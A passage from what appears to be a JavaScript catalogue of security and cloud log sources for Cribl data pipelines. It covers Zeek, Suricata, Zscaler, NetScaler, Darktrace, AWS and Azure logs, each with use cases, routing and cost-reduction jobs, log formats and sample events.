        destinations: ['Splunk', 'CrowdStrike NG SIEM', 'Microsoft Sentinel', 'Elastic Security', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Structured Syslog (stream mode) / Security Log stream / Juniper Security Director / SNMP traps',
        logFormat: 'Structured syslog (RFC 5424) with key=value pairs. Key message types: RT_FLOW_SESSION_OPEN, RT_FLOW_SESSION_CLOSE, RT_FLOW_SESSION_DENY, IDP_ATTACK_LOG_EVENT, APPTRACK_SESSION_CLOSE, KMD_VPN_UP_ALARM, KMD_VPN_DOWN_ALARM, CHASSISD_SNMP_TRAP*. Fields: source-address, destination-address, source-port, destination-port, service-name, nat-source-address, application, nested-application, policy-name, source-zone-name, destination-zone-name, elapsed-time, bytes-from-client, bytes-from-server, packets-from-client, packets-from-server.',
        avgEPS: '10,000-1,000,000 EPS depending on traffic volume and enabled log types (IDP at full verbosity is very high)',
        sampleEvent: '<14>1 2026-06-17T14:32:08.234Z srx-fw-01 RT_FLOW - RT_FLOW_SESSION_CLOSE [junos@2636.1.1.1.2.129 reason="TCP FIN" source-address="10.0.1.50" source-port="49152" destination-address="203.0.113.100" destination-port="443" connection-tag="0" service-name="junos-https" nat-source-address="198.51.100.1" nat-source-port="32768" nat-destination-address="203.0.113.100" nat-destination-port="443" nat-connection-tag="0" src-nat-rule-type="source rule" src-nat-rule-name="pat-internet" dst-nat-rule-type="N/A" dst-nat-rule-name="N/A" protocol-id="6" policy-name="allow-web-outbound" source-zone-name="trust" destination-zone-name="untrust" session-id-32="574326" packets-from-client="25" bytes-from-client="15000" packets-from-server="20" bytes-from-server="89000" elapsed-time="45" application="SSL" nested-application="MICROSOFT-OFFICE365" username="jperks@corp" roles="N/A" encrypted="Yes"]'
      }
    ]
  },
  {
    category: 'IDS / Network Security',
    icon: '🔍',
    sources: [
      {
        id: 'zeek-logs',
        name: 'Zeek (Bro) Network Logs',
        vendor: 'Zeek Project (Open Source)',
        description: 'Passive network traffic analysis logs from Zeek sensors covering connections (conn.log), DNS queries (dns.log), HTTP transactions (http.log), SSL/TLS sessions (ssl.log), file transfers (files.log), and protocol-specific analyzers. Tab-separated or JSON format.',
        status: 'available',
        useCases: ['Network Detection & Response', 'Threat Hunting', 'Lateral Movement Detection', 'DNS Tunneling Detection', 'Certificate Monitoring', 'Protocol Anomaly Detection', 'Forensic Analysis'],
        personas: ['Security Engineering', 'SOC', 'Threat Hunting', 'Incident Response', 'Network Security'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build detections for lateral movement, DNS tunneling, beaconing behavior, and JA3/JA3S fingerprint matches using structured Zeek fields' },
            { persona: 'Data End User / Analyst', job: 'Hunt for anomalous connections using conn.log duration, byte ratios, and unusual port/protocol combinations' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Reduce Zeek conn.log volume by 60-80% by filtering local broadcast, DNS responses, and short-lived ephemeral connections while preserving long-duration and high-byte flows' },
            { persona: 'Data Engineer', job: 'Route Zeek notice.log and weird.log directly to SIEM while conn.log goes to Lake with sampled subsets to SIEM for baseline analytics' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor network throughput, connection counts, and protocol distribution trends from Zeek conn.log metadata' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Parse Zeek TSV and JSON output formats and configure per-log-type routing rules within 30 minutes using pack pipelines' }
          ]}
        ],
        criblProducts: ['Stream', 'Edge', 'Lake', 'Search', 'Guard'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Elastic Security', 'Microsoft Sentinel', 'Google Chronicle', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'File monitor (Cribl Edge) / Syslog / Kafka / Direct file ingest',
        logFormat: 'TSV (tab-separated) or JSON. Key log types: conn.log (uid, id.orig_h, id.resp_h, id.resp_p, proto, duration, orig_bytes, resp_bytes), dns.log (query, qtype, answers), http.log (method, host, uri, status_code), ssl.log (server_name, subject, ja3, ja3s), notice.log (note, msg, src, dst).',
        avgEPS: '10,000-500,000 EPS depending on network throughput and enabled analyzers',
        sampleEvent: '{"ts":"2026-06-11T14:32:08.000000Z","uid":"CYF1xz3qOViQKLMwXe","id.orig_h":"10.0.1.50","id.orig_p":52341,"id.resp_h":"203.0.113.100","id.resp_p":443,"proto":"tcp","service":"ssl","duration":45.2,"orig_bytes":15000,"resp_bytes":89000,"conn_state":"SF","missed_bytes":0,"history":"ShADadFf","orig_pkts":25,"resp_pkts":20,"ja3":"a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6","ja3s":"b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7"}'
      },
      {
        id: 'suricata-ids',
        name: 'Suricata IDS/IPS Alerts',
        vendor: 'Open Information Security Foundation (OISF)',
        description: 'Network intrusion detection and prevention alerts from Suricata in EVE JSON format. Covers signature-based detection, protocol anomalies, DNS events, TLS metadata, file extraction, and flow records. Compatible with Emerging Threats and Snort rule sets.',
        status: 'available',
        useCases: ['Intrusion Detection', 'Signature-Based Threat Detection', 'Protocol Anomaly Detection', 'File Extraction', 'Network Forensics', 'Compliance Monitoring', 'Lateral Movement Detection'],
        personas: ['Security Engineering', 'SOC', 'Network Security', 'Incident Response', 'Threat Hunting'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Correlate Suricata alert signatures with flow data and DNS events to build high-confidence composite detections' },
            { persona: 'Data End User / Analyst', job: 'Investigate IDS alerts by pivoting from signature match to full session context including DNS, TLS, and file metadata' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter noisy informational alerts (severity 3) and DNS query logs while preserving all severity 1-2 alerts and file extraction events for SIEM' },
            { persona: 'Data Engineer', job: 'Route alert events to SIEM and flow/protocol metadata to Lake, reducing SIEM volume by 75% while maintaining full forensic capability' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor Suricata sensor health, dropped packets, and rule processing latency to ensure detection coverage' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Ingest Suricata EVE JSON via file monitor or syslog and configure alert-priority routing within 20 minutes' }
          ]}
        ],
        criblProducts: ['Stream', 'Edge', 'Lake', 'Search', 'Guard'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Elastic Security', 'Microsoft Sentinel', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'File monitor (eve.json) / Syslog / Redis / Kafka',
        logFormat: 'EVE JSON — event_type field determines schema: alert (signature, severity, category), dns (rrname, rrtype, rcode), tls (subject, issuer, ja3), http (hostname, url, method), flow (bytes_toserver, bytes_toclient, pkts).',
        avgEPS: '5,000-200,000 EPS depending on network throughput, rule count, and event types enabled',
        sampleEvent: '{"timestamp":"2026-06-11T14:32:08.000000+0000","flow_id":1234567890,"event_type":"alert","src_ip":"185.220.101.33","src_port":44100,"dest_ip":"10.0.1.50","dest_port":22,"proto":"TCP","alert":{"action":"allowed","gid":1,"signature_id":2024792,"rev":3,"signature":"ET SCAN SSH Brute Force Attempt","category":"Attempted Administrator Privilege Gain","severity":1},"flow":{"pkts_toserver":15,"pkts_toclient":12,"bytes_toserver":4500,"bytes_toclient":3800,"start":"2026-06-11T14:32:00.000000+0000"}}'
      },
      {
        id: 'zscaler-zpa',
        name: 'Zscaler Private Access (ZPA) Logs',
        vendor: 'Zscaler',
        description: 'Zero trust application access logs from Zscaler Private Access covering user-to-application connections, connector health, policy evaluations, and session telemetry. Provides visibility into internal application access without traditional VPN infrastructure.',
        status: 'available',
        useCases: ['Zero Trust Access Monitoring', 'Application Discovery', 'Lateral Movement Prevention', 'Connector Health', 'Policy Effectiveness', 'User Experience Monitoring', 'Shadow IT Detection'],
        personas: ['Security Engineering', 'SOC', 'Platform Engineering', 'Network Engineering', 'Compliance'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Detect lateral movement attempts via ZPA — users accessing applications outside their normal pattern, failed policy evaluations, and connector bypass attempts' },
            { persona: 'Data End User / Analyst', job: 'Investigate blocked application access events to distinguish misconfigured policies from actual unauthorized access attempts' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor ZPA connector health, application segment response times, and broker-to-connector latency to ensure reliable internal application delivery' },
            { persona: 'Data End User / Analyst', job: 'Track application usage patterns, identify underutilized app segments, and measure user experience quality across connection types' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Suppress ZPA health probe and keepalive traffic (50-60% of volume) while routing actual user access events and policy violations to SIEM' },
            { persona: 'Data Engineer', job: 'Aggregate per-session byte counts into summary events rather than forwarding per-packet telemetry to SIEM at full resolution' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Configure ZPA Log Streaming Service (LSS) to Cribl Stream and map application segments to business context for enrichment' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search', 'Guard'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Log Streaming Service (LSS) / Nanolog Streaming Service (NSS)',
        logFormat: 'JSON — fields include LogTimestamp, Customer, SessionID, ConnectionID, InternalReason, ConnectionStatus, ClientPublicIP, ClientPrivateIP, ApplicationSegment, ServerIP, Connector, Policy, User.',
        avgEPS: '2,000-30,000 EPS (scales with user count and connection frequency)',
        sampleEvent: '{"LogTimestamp":"2026-06-11T14:32:08Z","Customer":"cribl.io","SessionID":"sess-a1b2c3","ConnectionID":"conn-d4e5f6","InternalReason":"","ConnectionStatus":"active","ClientPublicIP":"198.51.100.45","ClientPrivateIP":"10.0.1.50","ClientLatitude":37.7749,"ClientLongitude":-122.4194,"ApplicationSegment":"Internal-HR-Portal","ServerIP":"10.100.5.22","ServerPort":443,"Connector":"zpa-connector-us-east-01","ConnectorIP":"10.100.1.5","ConnectorPort":21344,"Policy":"HR-Team-Access","PolicyProcessingTime":12,"User":"mthompson@cribl.io","ServiceCount":1,"ClientToClient":"","DoubleEncryption":"yes"}'
      },
      {
        id: 'citrix-netscaler',
        name: 'Citrix NetScaler / ADC Logs',
        vendor: 'Citrix (Cloud Software Group)',
        description: 'Application delivery controller logs from Citrix NetScaler covering load balancing decisions, SSL offload events, WAF/bot management alerts, authentication (nFactor/SAML), and gateway session telemetry. Provides full visibility into application delivery and access control.',
        status: 'available',
        useCases: ['Web Application Security', 'Load Balancing Health', 'SSL Certificate Monitoring', 'Authentication Security', 'Bot Detection', 'Performance Optimization', 'Gateway Access Control'],
        personas: ['Security Engineering', 'Platform Engineering', 'SOC', 'Network Engineering', 'IT Operations'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Detect application-layer attacks including credential stuffing against NetScaler Gateway, WAF signature matches, bot activity, and SSL/TLS downgrade attempts' },
            { persona: 'Data End User / Analyst', job: 'Investigate authentication failures at NetScaler Gateway to identify brute-force campaigns and compromised VPN credentials' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor virtual server health, backend service response time, SSL certificate expiry, and connection surge events that indicate capacity pressure' },
            { persona: 'Data End User / Analyst', job: 'Track load balancing distribution, identify backend server hot spots, and measure application response time percentiles' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter health monitor probe events and TCP connection state changes (70-80% of volume) while routing security events and auth failures to SIEM' },
            { persona: 'Data Engineer', job: 'Aggregate per-request metrics into time-bucketed summaries for performance monitoring rather than forwarding individual transaction logs' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Configure NetScaler syslog/NSLOG and AppFlow export to Cribl Stream with proper parsing of the multi-format event types' }
          ]}
        ],
        criblProducts: ['Stream', 'Edge', 'Lake', 'Search', 'Guard'],
        destinations: ['Splunk', 'CrowdStrike NG SIEM', 'Cribl Lake', 'Datadog', 'Amazon S3', 'Elastic'],
        collectionMethod: 'Syslog / NSLOG / AppFlow (IPFIX) / Management REST API',
        logFormat: 'Citrix syslog format: <date> <hostname> <module> <feature> <severity> <event_id> <message>. Key modules: SSLVPN (gateway), APPFW (WAF), TCP, HTTP, AAA (auth).',
        avgEPS: '10,000-200,000 EPS (extremely high from HTTP transaction logging; security events are small subset)',
        sampleEvent: 'Jun 11 14:32:08 ns-prod-01 0-PPE-0 : AAA LOGIN_FAILED 1234567 0 : User mthompson@cribl.io - Client_ip 198.51.100.45 - Failure_reason "Invalid credentials" - Vserver vs-gateway-prod - Nat_ip 10.0.1.100 - Browser_type "Chrome/120" - Group(s) "N/A" - Flags 0 - AuthType LDAP+RADIUS'
      },
      {
        id: 'darktrace-ndr',
        name: 'Darktrace AI Network Detection & Response',
        vendor: 'Darktrace',
        description: 'AI-driven network detection alerts from Darktrace covering model breaches, device anomaly scoring, connection-level behavioral analysis, and autonomous response (Antigena) actions. Uses unsupervised machine learning to establish baselines and detect deviations without signatures.',
        status: 'available',
        useCases: ['AI-Driven Threat Detection', 'Insider Threat Detection', 'C2 Communication Detection', 'Lateral Movement Detection', 'Anomalous Data Transfer', 'Compromised Credential Detection', 'Zero-Day Detection'],
        personas: ['SOC', 'Security Engineering', 'Threat Hunting', 'Incident Response', 'Network Security'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Correlate Darktrace model breaches with endpoint and identity events to validate AI-generated alerts and reduce false positives through multi-signal confirmation' },
            { persona: 'Data End User / Analyst', job: 'Investigate high-severity model breaches by pivoting from Darktrace anomaly scores to raw network evidence and affected device timelines' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor Darktrace sensor coverage, model health, and detection coverage gaps across network segments and VLANs' },
            { persona: 'Data End User / Analyst', job: 'Track model breach volume and severity trends to measure network security posture improvements over time' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter low-severity model breaches (score <40) and informational connection logs to Lake while routing confirmed threats and Antigena actions to SIEM — reducing volume by 70-80%' },
            { persona: 'Data Engineer', job: 'Aggregate per-device anomaly scores into hourly summaries rather than forwarding every scored connection event at full resolution' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Configure Darktrace syslog CEF output or webhook integration and map model breach categories to common threat taxonomy' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search', 'Guard'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Google Chronicle', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Syslog (CEF) / Webhook (JSON) / Darktrace API',
        logFormat: 'JSON (webhook) or CEF (syslog) — fields include model breach ID, model name/type, severity score (0-100), device info (hostname, IP, MAC), threat category, MITRE mapping, connection details, Antigena action taken.',
        avgEPS: '1,000-50,000 EPS (model breaches are low volume; connection scoring telemetry can be high)',
        sampleEvent: '{"createdAt":"2026-06-16T14:32:08Z","modelBreach":{"pbid":456789,"modelName":"Compromise::Beaconing Activity To External Rare","score":87,"category":"Compromise","description":"Device making regular connections at unusual intervals to rare external endpoint"},"device":{"did":123456,"hostname":"workstation-042","ip":"10.0.1.50","mac":"aa:bb:cc:dd:ee:ff","typename":"Desktop"},"triggeredComponents":[{"metric":"connections","value":"45.77.123.99:443","filters":{"interval":"60s","jitter":"15%","duration":"3600s"}}],"mitreTechniques":["T1071.001","T1573.002"]}'
      }
    ]
  },
  {
    category: 'Cloud Infrastructure',
    icon: '🏗️',
    sources: [
      {
        id: 'aws-cloudtrail',
        name: 'AWS CloudTrail',
        vendor: 'Amazon Web Services',
        description: 'API activity logs for AWS accounts capturing every API call made via the console, CLI, SDKs, and services. Records who made the call, from where, what was requested, and the response. Essential for security monitoring, compliance auditing, and operational troubleshooting.',
        status: 'available',
        useCases: ['API Security Monitoring', 'Privilege Escalation Detection', 'Resource Change Tracking', 'Compliance Auditing', 'Incident Investigation', 'Cost Attribution', 'Unauthorized Access Detection'],
        personas: ['Cloud Security', 'SOC', 'DevOps', 'Platform Engineering', 'Compliance', 'Incident Response'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build detections for IAM privilege escalation, unauthorized resource access, security group modifications, and credential compromise indicators' },
            { persona: 'Data End User / Analyst', job: 'Investigate suspicious API activity by correlating source IP, user identity, and resource targets across CloudTrail events' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Suppress high-volume read-only API calls (Describe*, List*, Get*) and KMS decrypt events, reducing CloudTrail volume by 70-85% while preserving all mutating and auth events' },
            { persona: 'Data Engineer', job: 'Route security-critical events (ConsoleLogin failures, IAM changes, S3 policy modifications) to SIEM while sending full CloudTrail to Lake for compliance retention' }
          ]},
          { category: 'Compliance & Governance', jobs: [
            { persona: 'Platform Administrator', job: 'Maintain 365-day CloudTrail retention with tamper-proof storage in Lake to satisfy SOC 2 and PCI-DSS audit requirements' },
            { persona: 'Data End User / Analyst', job: 'Generate compliance reports showing all IAM policy changes, root account usage, and cross-account access within any time window' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Configure S3-SQS source for CloudTrail ingestion and set up event-type-based routing within 30 minutes' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search', 'Guard'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Google Chronicle', 'Elastic Security', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'S3 + SQS / CloudWatch Logs / EventBridge / Direct S3 pull',
        logFormat: 'JSON — fields include eventTime, eventSource, eventName, awsRegion, sourceIPAddress, userIdentity (type, arn, accountId), requestParameters, responseElements, errorCode, errorMessage, readOnly, eventType.',
        avgEPS: '10,000-1,000,000+ EPS depending on account count, service usage, and data event logging',
        sampleEvent: '{"eventVersion":"1.09","userIdentity":{"type":"IAMUser","principalId":"AIDA1234567890EXAMPLE","arn":"arn:aws:iam::123456789012:user/jperks","accountId":"123456789012","userName":"jperks"},"eventTime":"2026-06-11T14:32:08Z","eventSource":"iam.amazonaws.com","eventName":"CreateUser","awsRegion":"us-east-1","sourceIPAddress":"203.0.113.42","userAgent":"console.amazonaws.com","requestParameters":{"userName":"new-service-account"},"responseElements":{"user":{"userName":"new-service-account","userId":"AIDA0987654321EXAMPLE"}}}'
      },
      {
        id: 'aws-cloudwatch',
        name: 'AWS CloudWatch Logs',
        vendor: 'Amazon Web Services',
        description: 'Application and infrastructure logs from AWS services including Lambda functions, ECS containers, API Gateway, RDS, and custom applications. Structured and unstructured log streams organized by log groups.',
        status: 'available',
        useCases: ['Application Monitoring', 'Error Tracking', 'Performance Analysis', 'Lambda Function Debugging', 'Container Observability', 'API Gateway Monitoring', 'Custom Metric Extraction'],
        personas: ['DevOps', 'Platform Engineering', 'SRE', 'Application Development', 'NOC'],
        jobsToBeDone: [
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Reduce CloudWatch Logs volume by 50-70% by filtering debug-level Lambda logs and retaining only errors, warnings, and cold starts for SIEM/observability platforms' },
            { persona: 'Data Engineer', job: 'Extract metrics from unstructured log lines (latency, error counts, memory usage) and route to metrics platforms while sending raw logs to Lake' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor Lambda cold start rates, timeout errors, and memory utilization trends across all functions' },
            { persona: 'Data End User / Analyst', job: 'Trace API Gateway 5xx errors to downstream Lambda failures and identify root cause within 5 minutes' }
          ]},
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build detections for unauthorized API calls, unusual Lambda invocation patterns, and application-layer attack indicators in custom app logs' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Configure CloudWatch Logs subscription filter to Kinesis Firehose and connect to Cribl Stream for multi-destination routing' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search', 'Guard'],
        destinations: ['Splunk', 'Datadog', 'New Relic', 'Dynatrace', 'Elastic', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'CloudWatch Logs Subscription Filter → Kinesis Firehose / S3 + SQS / Lambda forwarder',
        logFormat: 'Mixed — JSON (structured app logs, API Gateway), plain text (Lambda stdout), CloudWatch Logs Insights format. Key metadata: logGroup, logStream, timestamp, message.',
        avgEPS: '50,000-5,000,000+ EPS depending on application count and log verbosity',
        sampleEvent: '{"logGroup":"/aws/lambda/api-handler","logStream":"2026/06/11/[$LATEST]abc123","timestamp":1718107928000,"message":"START RequestId: e1a2b3c4-d5e6-f7a8 Version: $LATEST\\nINFO: Processing request for user jperks, method=GET path=/api/users duration=45ms\\nEND RequestId: e1a2b3c4-d5e6-f7a8\\nREPORT RequestId: e1a2b3c4-d5e6-f7a8 Duration: 45.23 ms Billed Duration: 46 ms Memory Size: 256 MB Max Memory Used: 128 MB Init Duration: 234.56 ms"}'
      },
      {
        id: 'aws-cloudwatch-metrics',
        name: 'AWS CloudWatch Metrics Streams',
        vendor: 'Amazon Web Services',
        description: 'Real-time streaming of AWS CloudWatch metrics in JSON format via Kinesis Data Firehose. Delivers per-minute granularity metric data points for all AWS services — EC2, RDS, Lambda, ELB, ECS, DynamoDB, and 200+ namespaces. Replaces polling-based metric collection with push-based streaming, enabling real-time alerting and long-term storage at a fraction of CloudWatch native retention cost.',
        status: 'available',
        useCases: ['Infrastructure Health Monitoring', 'Auto-Scaling Validation', 'Capacity Planning', 'Cost Anomaly Detection', 'SLA Tracking', 'Cross-Account Metric Aggregation', 'Security Metric Analysis', 'Custom Dashboard Federation'],
        personas: ['SRE', 'Platform Engineering', 'DevOps', 'FinOps', 'NOC', 'Security Engineering'],
        jobsToBeDone: [
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor real-time EC2 CPU, memory (via CW Agent), disk, and network metrics across all instances to detect resource exhaustion and auto-scaling failures within 60 seconds of onset' },
            { persona: 'Data End User / Analyst', job: 'Track RDS connection counts, read/write latency, freeable memory, and replica lag to predict database capacity issues before application impact' },
            { persona: 'Jack of All Trades', job: 'Build unified infrastructure dashboards correlating ELB request counts and latency with backend EC2/ECS metrics and Lambda concurrency to visualize full-stack health in a single pane' }
          ]},
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build anomaly detections on GuardDuty finding counts, IAM authentication failure rates, and KMS decryption volume spikes that indicate credential compromise or data exfiltration attempts' },
            { persona: 'Data End User / Analyst', job: 'Detect cryptomining by identifying EC2 instances with sustained >95% CPU utilization, anomalous network out bytes, and no corresponding application traffic in ALB logs' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter low-value high-volume metric namespaces (AWS/Usage, AWS/Billing dimension-per-resource) and downsample 1-minute metrics to 5-minute for cold storage — reducing metric stream volume by 60-80% while preserving alerting fidelity' },
            { persona: 'Data Engineer', job: 'Route critical infrastructure metrics (EC2, RDS, ELB, Lambda) to Datadog/Dynatrace for real-time alerting while streaming all namespaces to Lake at storage-tier cost for FinOps analysis' },
            { persona: 'Team Leader', job: 'Eliminate CloudWatch GetMetricData API costs ($0.01/1000 metrics) by using push-based Metric Streams at flat $0.003/1000 metric updates — 70% cost reduction at scale' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Configure CloudWatch Metric Stream → Kinesis Firehose → Cribl Stream HTTP source in JSON format with namespace filtering within 20 minutes per AWS account' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search', 'Guard'],
        destinations: ['Datadog', 'Dynatrace', 'New Relic', 'Splunk', 'Cribl Lake', 'Amazon S3', 'Prometheus Remote Write'],
        collectionMethod: 'CloudWatch Metric Stream → Kinesis Data Firehose (HTTP endpoint) / S3 delivery',
        logFormat: 'JSON (OpenTelemetry 0.7.0 format) — fields: metric_stream_name, account_id, region, namespace, metric_name, dimensions (key-value pairs), timestamp, value (min, max, sum, count, p99, etc.), unit. Each record is a single metric data point with statistical values.',
        avgEPS: '100,000-10,000,000+ metric data points per hour depending on account size, service count, and namespace filtering (a 500-instance environment with default namespaces generates ~2M data points/hour)',
        sampleEvent: '{"metric_stream_name":"prod-infra-metrics","account_id":"123456789012","region":"us-east-1","namespace":"AWS/EC2","metric_name":"CPUUtilization","dimensions":{"InstanceId":"i-0abc123def456"},"timestamp":1718544728000,"value":{"max":92.3,"min":88.1,"sum":450.7,"count":5.0,"p99":92.1},"unit":"Percent"}\n{"metric_stream_name":"prod-infra-metrics","account_id":"123456789012","region":"us-east-1","namespace":"AWS/RDS","metric_name":"DatabaseConnections","dimensions":{"DBInstanceIdentifier":"prod-primary"},"timestamp":1718544728000,"value":{"max":245,"min":198,"sum":1105,"count":5.0},"unit":"Count"}\n{"metric_stream_name":"prod-infra-metrics","account_id":"123456789012","region":"us-east-1","namespace":"AWS/ApplicationELB","metric_name":"TargetResponseTime","dimensions":{"LoadBalancer":"app/prod-api-alb/abc123","TargetGroup":"targetgroup/prod-api/def456"},"timestamp":1718544728000,"value":{"max":0.892,"min":0.023,"sum":2.345,"count":15.0,"p99":0.756},"unit":"Seconds"}'
      },
      {
        id: 'azure-activity',
        name: 'Azure Activity & Monitor Logs',
        vendor: 'Microsoft Azure',
        description: 'Azure platform activity logs capturing subscription-level operations (resource creation, deletion, modification), Azure AD sign-in events, resource health changes, and service health notifications. Equivalent to AWS CloudTrail for Azure environments.',
        status: 'available',
        useCases: ['Resource Change Tracking', 'Access Monitoring', 'Compliance Auditing', 'Cost Attribution', 'Service Health Monitoring', 'Privilege Escalation Detection', 'Policy Compliance'],
        personas: ['Cloud Security', 'SOC', 'DevOps', 'Platform Engineering', 'Compliance'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build detections for role assignment changes, NSG modifications, key vault access anomalies, and storage account exposure' },
            { persona: 'Data End User / Analyst', job: 'Investigate unauthorized resource modifications by correlating caller identity, IP address, and operation details' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter high-volume read operations and health check polls while preserving write operations and authentication events for SIEM' },
            { persona: 'Data Engineer', job: 'Route security-critical categories (Administrative, Security, Policy) to SIEM and full activity log to Lake for compliance' }
          ]},
          { category: 'Compliance & Governance', jobs: [
            { persona: 'Platform Administrator', job: 'Maintain complete audit trail of all Azure resource modifications for SOC 2 and regulatory compliance' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Configure Azure Event Hub export for Activity Logs and connect to Cribl Stream for parsing and routing' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search', 'Guard'],
        destinations: ['Microsoft Sentinel', 'Splunk', 'CrowdStrike NG SIEM', 'Elastic Security', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Azure Event Hub / Azure Monitor Diagnostic Settings / REST API',
        logFormat: 'JSON — fields include time, resourceId, operationName, category, resultType, callerIpAddress, identity, properties. Categories: Administrative, Security, ServiceHealth, Alert, Recommendation, Policy, Autoscale, ResourceHealth.',
        avgEPS: '5,000-500,000 EPS depending on subscription count and resource activity',
        sampleEvent: '{"time":"2026-06-11T14:32:08Z","resourceId":"/subscriptions/a1b2c3d4/resourceGroups/prod-rg/providers/Microsoft.Compute/virtualMachines/web-server-01","operationName":"Microsoft.Compute/virtualMachines/write","category":"Administrative","resultType":"Success","callerIpAddress":"203.0.113.42","identity":{"claims":{"name":"Jordan Perks","upn":"jperks@contoso.com"}},"properties":{"statusCode":"OK","serviceRequestId":"e1a2b3c4-d5e6-f7a8"}}'
      },
      {
        id: 'gcp-audit-logs',
        name: 'GCP Cloud Audit Logs',
        vendor: 'Google Cloud Platform',
        description: 'Google Cloud audit logs capturing Admin Activity (always-on), Data Access (configurable), System Events, and Policy Denied events across all GCP services. Essential for security monitoring and compliance in GCP environments.',
        status: 'available',
        useCases: ['API Security Monitoring', 'Data Access Tracking', 'Compliance Auditing', 'Privilege Escalation Detection', 'Resource Change Monitoring', 'Service Account Abuse Detection'],
        personas: ['Cloud Security', 'SOC', 'DevOps', 'Platform Engineering', 'Compliance'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build detections for service account key creation, IAM policy changes, firewall rule modifications, and unusual data access patterns' },
            { persona: 'Data End User / Analyst', job: 'Investigate suspicious GCP API activity by correlating principal email, source IP, and method across audit log entries' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter high-volume Data Access audit logs (storage.objects.get, bigquery.jobs.get) reducing volume by 80%+ while preserving Admin Activity and Policy Denied events' },
            { persona: 'Data Engineer', job: 'Route Admin Activity logs to SIEM in real-time while batching Data Access logs to Lake for on-demand forensic queries' }
          ]},
          { category: 'Compliance & Governance', jobs: [
            { persona: 'Platform Administrator', job: 'Maintain tamper-proof audit trail of all GCP administrative actions for FedRAMP and SOC 2 compliance' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Configure GCP log sink to Pub/Sub and connect Cribl Stream pull source for parsing and multi-destination routing' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search', 'Guard'],
        destinations: ['Google Chronicle', 'Splunk', 'CrowdStrike NG SIEM', 'Elastic Security', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Pub/Sub subscription / Cloud Storage sink / BigQuery export',
